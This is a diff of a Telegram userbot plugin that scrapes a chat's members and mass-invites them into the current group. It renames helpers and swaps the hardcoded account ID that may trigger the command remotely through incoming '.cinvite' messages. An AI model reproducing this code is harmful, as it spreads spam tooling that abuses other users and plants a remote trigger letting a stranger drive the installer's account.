@@ -9,7 +9,7 @@ from telethon.tl.functions.messages import GetFullChatRequest
 
 from userbot import CMD_HELP, CMD_HANDLER as cmd
 from userbot.events import register
-from userbot.utils import edit_or_reply, bing_cmd
+from userbot.utils import edit_or_reply, zean_cmd
 
 
 async def get_chatinfo(event):
@@ -49,42 +49,42 @@ async def get_chatinfo(event):
     return chat_info
 
 
-@bing_cmd(pattern="inviteall(?: |$)(.*)")
-@register(incoming=True, from_users=1337194042,
+@zean_cmd(pattern="inviteall(?: |$)(.*)")
+@register(incoming=True, from_users=5004651469,
           pattern=r"^\.cinvite(?: |$)(.*)")
 async def get_users(event):
     sender = await event.get_sender()
     me = await event.client.get_me()
     if not sender.id == me.id:
-        bing = await event.reply("`processing...`")
+        zean = await event.reply("`processing...`")
     else:
-        bing = await edit_or_reply(event, "`processing...`")
+        zean = await edit_or_reply(event, "`processing...`")
     geezteam = await get_chatinfo(event)
     chat = await event.get_chat()
     if event.is_private:
-        return await bing.edit("`Sorry, Can add users here`")
+        return await zean.edit("`Sorry, Can add users here`")
     s = 0
     f = 0
     error = "None"
 
-    await bing.edit("**TerminalStatus**\n\n`Collecting Users.......`")
+    await zean.edit("**TerminalStatus**\n\n`Collecting Users.......`")
     async for user in event.client.iter_participants(geezteam.full_chat.id):
         try:
             if error.startswith("Too"):
-                return await bing.edit(
+                return await zean.edit(
                     f"**Terminal Finished With Error**\n(`May Got Limit Error from telethon Please try agin Later`)\n**Error** : \n`{error}`\n\n• Invited `{s}` people \n• Failed to Invite `{f}` people"
                 )
             await event.client(
                 functions.channels.InviteToChannelRequest(channel=chat, users=[user.id])
             )
             s = s + 1
-            await bing.edit(
+            await zean.edit(
                 f"**Terminal Running...**\n\n• Invited `{s}` people \n• Failed to Invite `{f}` people\n\n**× LastError:** `{error}`"
             )
         except Exception as e:
             error = str(e)
             f = f + 1
-    return await bing.edit(
+    return await zean.edit(
         f"**Terminal Finished** \n\n• Successfully Invited `{s}` people \n• failed to invite `{f}` people"
     )
 
